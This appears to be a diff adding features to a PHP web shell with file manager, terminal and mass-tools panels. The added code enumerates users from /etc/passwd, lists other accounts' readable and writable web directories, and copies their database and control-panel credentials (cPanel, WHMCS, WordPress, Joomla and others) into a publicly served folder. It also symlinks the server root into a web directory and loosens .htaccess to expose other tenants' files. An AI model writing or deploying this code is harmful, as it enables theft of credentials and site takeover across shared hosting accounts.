@@ -599,6 +599,32 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
             overflow-y: auto;
             background-color: #000;
         }
+
+        .info-box {
+            background-color: #212529;
+            border: 1px solid #495057;
+            border-radius: 0.25rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            font-family: 'Courier New', Courier, monospace;
+            color: #f8f9fa;
+        }
+        .info-box pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            margin: 0;
+        }
+        .info-box .success { color: #28a745; }
+        .info-box .error { color: #dc3545; }
+        .info-box .warning { color: #ffc107; }
+        .info-box a { color: #0d6efd; }
+        .info-box table { width: 100%; border-collapse: collapse; }
+        .info-box table th, .info-box table td {
+            border: 1px solid #495057;
+            padding: 0.5rem;
+            text-align: left;
+        }
+        .info-box table th { background-color: #343a40; }
     </style>
 </head>
 
@@ -642,7 +668,9 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                         <button class="btn btn-sm btn-info" data-bs-toggle="modal" data-bs-target="#newFolderModal"><i class="fas fa-folder-plus me-1"></i>New Folder</button>
                         <button class="btn btn-danger" data-bs-toggle="modal" data-bs-target="#massToolsModal"><i class="fas fa-tools"></i> Mass Tools</button>
                         <button class="btn btn-sm btn-warning text-dark" data-bs-toggle="modal" data-bs-target="#commandModal"><i class="fas fa-terminal me-1"></i>Terminal</button>
-                        <button class="btn btn-sm btn-secondary" data-bs-toggle="modal" data-bs-target="#symlinkModal"><i class="fas fa-link me-1"></i>Symlink</button>
+                        <a href="?path=<?php echo urlencode($path); ?>&action=jumping" class="btn btn-sm btn-outline-light"><i class="fas fa-person-booth me-1"></i>Jumping</a>
+                        <a href="?path=<?php echo urlencode($path); ?>&action=config" class="btn btn-sm btn-outline-primary"><i class="fas fa-cogs me-1"></i>Config</a>
+                        <a href="?path=<?php echo urlencode($path); ?>&action=symlink" class="btn btn-sm btn-outline-info"><i class="fas fa-link me-1"></i>Symlink</a>
                         <button class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#serverInfoModal"><i class="fas fa-info-circle"></i> Server Info</button>
                     </div>
                     <div class="mt-3">
@@ -660,6 +688,171 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                 </div>
             </div>
 
+            <?php 
+            $action = $_GET['action'] ?? '';
+            if ($action == 'jumping' || $action == 'config' || $action == 'symlink') {
+                if($action == 'jumping') {
+                    $i = 0;
+                    echo '<div class="info-box"><pre>';
+                    $etc = @fopen("/etc/passwd", "r");
+                    
+                    if(!$etc) {
+                        echo '<span class="error">Cannot read /etc/passwd</span>';
+                    } else {
+                        while($passwd = fgets($etc)) {
+                            if($passwd == '') continue;
+                            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+                            
+                            foreach($user_jumping[1] as $user_jefri_jump) {
+                                $user_jumping_dir = "/home/$user_jefri_jump/public_html";
+                                if(is_readable($user_jumping_dir)) {
+                                    $i++;
+                                    $jrw = "[<span class='success'>R</span>] <a href='?path=".urlencode($user_jumping_dir)."' class='dir-row'>$user_jumping_dir</a>";
+                                    if(is_writable($user_jumping_dir)) {
+                                        $jrw = "[<span class='success'>RW</span>] <a href='?path=".urlencode($user_jumping_dir)."' class='dir-row'>$user_jumping_dir</a>";
+                                    }
+                                    echo $jrw;
+                                    
+                                    if(function_exists('posix_getpwuid')) {
+                                        $domain_jump = @file_get_contents("/etc/named.conf");   
+                                        if($domain_jump == '') {
+                                            echo " => (<span class='warning'>failed to get domain</span>)<br>";
+                                        } else {
+                                            preg_match_all("#var/named/(.*?).db#", $domain_jump, $domains_jump);
+                                            foreach($domains_jump[1] as $dj) {
+                                                $user_jumping_url = posix_getpwuid( @fileowner("/etc/valiases/$dj"));
+                                                $user_jumping_url = $user_jumping_url['name'];
+                                                if($user_jumping_url == $user_jefri_jump) {
+                                                    echo " => (<u>$dj</u>)<br>";
+                                                    break;
+                                                }
+                                            }
+                                        }
+                                    } else {
+                                        echo "<br>";
+                                    }
+                                }
+                            }
+                        }
+                        fclose($etc);
+                    }
+                    
+                    if($i > 0) {
+                        echo "<br>Total $i directories found on ".htmlspecialchars(gethostbyname($_SERVER['HTTP_HOST']));
+                    } else {
+                        echo "<span class='error'>No accessible directories found</span>";
+                    }
+                    
+                    echo '</pre></div>';
+                }
+                elseif($action == 'config') {
+                    $etc = @fopen("/etc/passwd", "r");
+                    $idx = @mkdir("{$nick}_CONFIG", 0777);
+                    $isi_htc = "Options all\nRequire None\nSatisfy Any";
+                    $htc = @fopen("{$nick}_CONFIG/.htaccess","w"); @fwrite($htc, $isi_htc);
+                    
+                    if(!$etc) {
+                        echo '<div class="info-box error">Cannot read /etc/passwd</div>';
+                    } else {
+                        while($passwd = fgets($etc)) {
+                            if($passwd == "") continue;
+                            preg_match_all('/(.*?):x:/', $passwd, $user_config);
+                            
+                            foreach($user_config[1] as $user_3X0RC1ST) {
+                                $user_config_dir = "/home/$user_3X0RC1ST/public_html/";
+                                if(is_readable($user_config_dir)) {
+                                    $grab_config = array(
+                                        "/home/$user_3X0RC1ST/.my.cnf" => "cpanel",
+                                        "/home/$user_3X0RC1ST/.accesshash" => "WHM-accesshash",
+                                        "/home/$user_3X0RC1ST/public_html/vdo_config.php" => "Voodoo",
+                                        "/home/$user_3X0RC1ST/public_html/bw-configs/config.ini" => "BosWeb",
+                                        "/home/$user_3X0RC1ST/public_html/config/koneksi.php" => "Lokomedia",
+                                        "/home/$user_3X0RC1ST/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
+                                        "/home/$user_3X0RC1ST/public_html/clientarea/configuration.php" => "WHMCS",
+                                        "/home/$user_3X0RC1ST/public_html/whm/configuration.php" => "WHMCS",
+                                        "/home/$user_3X0RC1ST/public_html/whmcs/configuration.php" => "WHMCS",
+                                        "/home/$user_3X0RC1ST/public_html/forum/config.php" => "phpBB",
+                                        "/home/$user_3X0RC1ST/public_html/sites/default/settings.php" => "Drupal",
+                                        "/home/$user_3X0RC1ST/public_html/config/settings.inc.php" => "PrestaShop",
+                                        "/home/$user_3X0RC1ST/public_html/app/etc/local.xml" => "Magento",
+                                        "/home/$user_3X0RC1ST/public_html/joomla/configuration.php" => "Joomla",
+                                        "/home/$user_3X0RC1ST/public_html/configuration.php" => "Joomla",
+                                        "/home/$user_3X0RC1ST/public_html/wp/wp-config.php" => "WordPress",
+                                        "/home/$user_3X0RC1ST/public_html/wordpress/wp-config.php" => "WordPress",
+                                        "/home/$user_3X0RC1ST/public_html/wp-config.php" => "WordPress",
+                                        "/home/$user_3X0RC1ST/public_html/admin/config.php" => "OpenCart",
+                                        "/home/$user_3X0RC1ST/public_html/slconfig.php" => "Sitelok",
+                                        "/home/$user_3X0RC1ST/public_html/application/config/database.php" => "Ellislab"
+                                    );
+                                    
+                                    foreach($grab_config as $config => $nama_config) {
+                                        $ambil_config = @file_get_contents($config);
+                                        if($ambil_config != '') {
+                                            $file_config = @fopen("{$nick}_CONFIG/$user_3X0RC1ST-$nama_config.txt","w"); @fputs($file_config,$ambil_config);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        fclose($etc);
+                        echo '<div class="info-box success"><a href="?path='.urlencode("$path/{$nick}_CONFIG").'">Config files collected! Click here to view</a></div>';
+                    }
+                }
+                elseif($action == 'symlink') {
+                    echo '<div class="info-box">';
+                    @mkdir('sym',0777); 
+                    $htaccess = "Options all \n DirectoryIndex sym.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; 
+                    $write = @fopen('sym/.htaccess','w'); @fwrite($write,$htaccess); @symlink('/','sym/root'); 
+                    
+                    $read_named_conf = @file('/etc/named.conf'); 
+                    if(!$read_named_conf) { 
+                        echo "<span class='error'>Cannot access /etc/named.conf</span>";
+                    } else { 
+                        echo '<table>
+                            <tr>
+                                <th>Domain</th>
+                                <th>User</th>
+                                <th>Symlink</th>
+                            </tr>';
+                        
+                        foreach($read_named_conf as $subject) { 
+                            if(stristr($subject,'zone')) { 
+                                preg_match_all('#zone "(.*)"#',$subject,$string); 
+                                flush(); 
+                                
+                                if(strlen(trim($string[1][0])) > 2) { 
+                                    $UID = @posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0])); 
+                                    $name = $string[1][0]; 
+                                    @symlink('/','sym/root'); 
+                                    
+                                    // Filter certain domains
+                                    $filtered = false;
+                                    $tlds = array('\\.ir','\\.il','\\.id','\\.sg','\\.edu','\\.gov','\\.go','\\.gob','\\.mil','\\.mi');
+                                    foreach($tlds as $tld) {
+                                        if(preg_match("/$tld/", $string[1][0])) {
+                                            $filtered = true;
+                                            break;
+                                        }
+                                    }
+                                    
+                                    if($filtered) {
+                                        $name = "<span class='warning'>".htmlspecialchars($string[1][0]).'</span>'; 
+                                    }
+                                    
+                                    echo "<tr>
+                                        <td><a href='http://www.".htmlspecialchars($string[1][0])."' target='_blank'>$name</a></td>
+                                        <td>".htmlspecialchars($UID['name'])."</td>
+                                        <td><a href='sym/root/home/".htmlspecialchars($UID['name'])."/public_html' target='_blank'>Symlink</a></td>
+                                    </tr>"; 
+                                    flush(); 
+                                } 
+                            }
+                        }
+                        echo '</table>'; 
+                    }
+                    echo '</div>';
+                }
+            } else { ?>
             <div class="table-responsive">
                 <table class="table table-dark table-hover table-sm align-middle">
                     <thead>
@@ -716,6 +909,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                     </tbody>
                 </table>
             </div>
+        <?php } ?>
         </main>
         <footer class="text-center text-muted small mt-4">© <?php echo date('Y'); ?> <?php echo htmlspecialchars($nick); ?></footer>
     </div>
@@ -1311,5 +1505,4 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
             });
         </script>
 </body>
-
 </html>
